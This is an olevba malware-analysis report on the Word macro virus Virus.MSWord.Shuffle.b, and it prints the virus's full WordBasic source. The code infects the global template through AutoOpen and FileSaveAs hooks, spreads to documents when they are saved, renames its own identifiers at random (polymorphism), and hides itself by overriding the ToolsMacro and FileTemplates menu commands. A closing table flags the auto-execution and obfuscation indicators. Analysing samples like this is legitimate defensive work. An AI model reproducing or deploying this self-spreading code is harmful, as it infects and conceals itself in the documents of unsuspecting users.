olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shuffle.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shuffle.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Shuffle.b - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
On Error Resume Next
ToolsMacro .Name = "autoopen", .Show = 1, .Delete
ToolsMacro .Name = "FileSaveAs", .Show = 1, .Delete
ToolsMacro .Name = "XXXXX", .Show = 1, .Delete
AppMinimize
ToolsMacro .Name = "autoopen", .Edit, .Show = 3
StartOfDocument
EndOfDocument 1
EditCopy
DocClose
ToolsMacro .Name = "XXXXX", .Show = 1, .Edit
StartOfDocument
EndOfDocument 1
EditPaste
DocClose 1
ToolsMacro .Name = "XXXXX", .Edit, .Show = 1
StartOfDocument
LineDown 35
LineDown 9, 1
EditCopy
DocClose
ToolsMacro .Name = "FileSaveAs", .Edit, .Show = 1
StartOfDocument
LineDown 1
EndOfDocument 1
EditPaste
DocClose 1
mutat
Payld
stlth
AppRestore
End Sub

Sub FlSvA()
Dim _fldg As FileSaveAs
GetCurValues _fldg
Dialog _fldg
If _fldg.Format = 0 Then _fldg.Format = 1
FlNm$ = FileName$()
FlMcr$ = FlNm$ + ":AutoOpen"
MacroCopy "Global:XXXXX", FlMcr$
FileSaveAs _fldg
End Sub

Function Rndnm$()
For Count = 1 To 5
   rndnx = Int(Rnd() * (90 - 65) + 65)
   rndnx$ = rndnx$ + Chr$(rndnx)
Next Count
Rndnm$ = rndnx$
End Function

Sub Payld()
Rndnm = Int(Rnd() * (51 - 1) + 1)
If Rndnm = 50 Then MsgBox "Greetings to: CyberDragon, CyberMonk, CyberBard, CyberSage, CyberTeck, CyberHawk, CyberBeef, CyberLich, CyberKnight.  From: CyberPhantom"
End Sub

Sub mutat()
ToolsMacro .Name = "XXXXX", .Edit, .Show = 1
StartOfDocument
dnatx$ = GetText$(606, 611) 'mutat
EditReplace .Find = dnatx$, .Replace = Rndnm$, .Direction = 0, .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0, .Wrap = 1, .FindAllWordForms = 0
dnatx$ = GetText$(648, 653) 'FlSvA
EditReplace .Find = dnatx$, .Replace = Rndnm$, .Direction = 0, .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0, .Wrap = 1, .FindAllWordForms = 0
dnatx$ = GetText$(658, 663) '_fldg
EditReplace .Find = dnatx$, .Replace = Rndnm$, .Direction = 0, .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0, .Wrap = 1, .FindAllWordForms = 0
dnatx$ = GetText$(612, 617) 'Payld
EditReplace .Find = dnatx$, .Replace = Rndnm$, .Direction = 0, .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0, .Wrap = 1, .FindAllWordForms = 0
dnatx$ = GetText$(869, 874) 'Rndnm
EditReplace .Find = dnatx$, .Replace = Rndnm$, .Direction = 0, .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0, .Wrap = 1, .FindAllWordForms = 0
dnatx$ = GetText$(880, 885) 'count
EditReplace .Find = dnatx$, .Replace = Rndnm$, .Direction = 0, .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0, .Wrap = 1, .FindAllWordForms = 0
dnatx$ = GetText$(1299, 1304) 'dnatx
EditReplace .Find = dnatx$, .Replace = Rndnm$, .Direction = 0, .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0, .Wrap = 1, .FindAllWordForms = 0
DocClose 1
End Sub

Sub stlth()
ToolsMacro .Name = "XXXXX", .Edit, .Show = 1
StartOfDocument
LineDown 123
LineDown 2, 1
EditCopy
DocClose
ToolsMacro .Name = "ToolsMacro", .Edit, .Show = 1
StartOfDocument
LineDown 1
EndOfDocument 1
EditPaste
DocClose 1

ToolsMacro .Name = "XXXXX", .Edit, .Show = 1
StartOfDocument
LineDown 127
LineDown 2, 1
EditCopy
DocClose
ToolsMacro .Name = "FileTemplates", .Edit, .Show = 1
StartOfDocument
LineDown 1
EndOfDocument 1
EditPaste
DocClose 1
End Sub

Sub TlsMc()
'No Macro
End Sub

Sub FlTpt()
'No Macro
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

